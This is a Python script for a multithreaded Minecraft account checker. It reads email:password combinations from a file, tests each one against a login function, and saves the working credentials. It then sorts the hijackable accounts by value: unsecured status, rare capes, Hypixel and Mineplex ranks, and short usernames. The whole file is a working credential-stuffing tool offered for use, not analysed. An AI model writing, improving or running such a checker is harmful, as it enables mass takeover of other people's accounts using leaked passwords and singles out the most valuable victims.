from account_checker import *
from cape_checker import *
from special_checker import *
from file_creator import *
from multiprocessing.dummy import Pool as ThreadPool
create_files()
account_file_lines = open(BASIC_PATH + os.sep + 'accounts.txt').read().split('\n')
count = 0
threads = 8
class Counter:
    valid = 0
    invalid = 0
    insecure = 0
    minecon = 0
    fivezig = 0
    optifine = 0
    labymod = 0
    liquidbounce = 0
    hypixelrank = 0
    hypixellevel = 0
    shortname = 0
    mineplexrank = 0

hypixel_min_level = 15

def check(x):
    if not account_file_lines[x].__contains__(':'):
        pass
    email_username = account_file_lines[x].split(':', 1)[0]
    password = account_file_lines[x].split(':', 1)[1]
    answer = account_login(email_username=email_username, password=password)

    if not str(answer).__contains__('Invalid credentials'):
        UUID = answer["availableProfiles"][0]["id"]
        USERNAME = answer["availableProfiles"][0]["name"]
        unsecure = minecon = fivezig = optifine = labymod = liquidbounce = hypixelrank = hypixellevel =  mineplexrank = \
        shortname = ''
        hp = hypixel_check(USERNAME)

        mpRank = mineplex_rank_check(USERNAME)

        open(FOLDER_PATH + os.sep + 'working.txt', 'a').write(account_file_lines[x] + "\n")
        Counter.valid += 1

        if bool(answer["user"]["secured"]) is False:
            open(FOLDER_PATH + os.sep + 'unsecure.txt', 'a').write(account_file_lines[x] + "\n")
            Counter.insecure += 1
            unsecure = USERNAME + ' is unsecure\n'
        if minecon_cape_request(UUID) is True:
            open(FOLDER_PATH + os.sep + 'minecon.txt', 'a').write(account_file_lines[x] + "\n")
            Counter.minecon += 1
            minecon = USERNAME + ' has a minecon cape\n'
        if five_zig_cape_request(UUID) is True:
            open(FOLDER_PATH + os.sep + '5zig.txt', 'a').write(account_file_lines[x] + "\n")
            Counter.fivezig += 1
            fivezig = USERNAME + ' has a 5zig cape\n'
        if optifine_cape_request(USERNAME) is True:
            open(FOLDER_PATH + os.sep + 'optifine.txt', 'a').write(account_file_lines[x] + "\n")
            Counter.optifine += 1
            optifine = USERNAME + ' has a optifine cape\n'
        if laby_mod_cape_request(UUID) is True:
            open(FOLDER_PATH + os.sep + 'labymod.txt', 'a').write(account_file_lines[x] + "\n")
            Counter.labymod += 1
            labymod = USERNAME + ' has a labymod cape\n'
        if liquidbounce_cape_request(UUID) is True:
            open(FOLDER_PATH + os.sep + 'liquidbounce.txt', 'a').write(account_file_lines[x] + "\n")
            Counter.liquidbounce += 1
            liquidbounce = USERNAME + ' has a liquidbounce cape\n'

        if hp[0] != 'False':
            open(FOLDER_PATH + os.sep + 'hypixelRank.txt', 'a').write(account_file_lines[x] + ' Rank: ' + hp[0] + "\n")
            Counter.hypixelrank += 1
            hypixelrank = USERNAME + ' Hypixelrank: ' + hp[0] + '\n'

        if int(hp[1]) >= hypixel_min_level and hp[1] != 0:
            open(FOLDER_PATH + os.sep + 'hypixelLevel.txt', 'a').write(account_file_lines[x] + ' Level: ' + str(hp[1]) + "\n")
            Counter.hypixellevel += 1
            hypixellevel = USERNAME + ' Hypixellevel: ' + str(hp[1]) + '\n'

        if mpRank is not False:
            open(FOLDER_PATH + os.sep + 'mineplexRank.txt', 'a').write(account_file_lines[x] + ' Rank: ' + mpRank + "\n")
            Counter.mineplexrank += 1
            mineplexrank = USERNAME + ' Mineplexrank: ' + mpRank + '\n'
        if under_four_character_long(USERNAME) is True:
            open(FOLDER_PATH + os.sep + 'special_name.txt', 'a').write(account_file_lines[x] + "\n")
            Counter.shortname += 1
            shortname = USERNAME + ' has a short name\n'
        print('Valid account ' + USERNAME + '\n' + unsecure + minecon + fivezig + optifine + labymod + liquidbounce
              + hypixelrank + hypixellevel + mineplexrank + shortname
              + '\n' + '---' * 6 + '\n')
        unsecure = minecon = fivezig = optifine = labymod = liquidbounce = hypixelrank = hypixellevel = mineplexrank = \
            shortname = ''
    else:
        print('Invalid Account' + '\n' + '---' * 6 + '\n')
        Counter.invalid += 1

def theads_two(numbers, threads=1):
    pool = ThreadPool(threads)
    results = pool.map(check, numbers)
    pool.close()
    pool.join()
    return results

if __name__ == "__main__":
    countt = []
    for x in range(len(account_file_lines)):
        countt.append(int(x))

    threads_one = theads_two(countt, threads)

Counter_list = [str(Counter.valid) + ' Valid accounts',str(Counter.invalid) + ' Invalid accounts',
             str(Counter.insecure) + ' Unsecure accounts',str(Counter.minecon) + ' Minecon-capes',
             str(Counter.fivezig) + ' 5zig-capes',str(Counter.optifine) + ' Optifine-capes',
             str(Counter.labymod) + ' Labymod-capes',str(Counter.liquidbounce) + ' LiquidBounce-capes',
             str(Counter.hypixelrank) + ' Hypixel-Rank accounts',str(Counter.hypixellevel) + ' Hypixel-Level accounts',
             str(Counter.mineplexrank) + ' Mineplex-Rank accounts',str(Counter.shortname) + ' Short-name accounts']

print('\n\nResult:\n')

for x in range(len(Counter_list) - 0):
    print(Counter_list[x])

print('Finished')
input()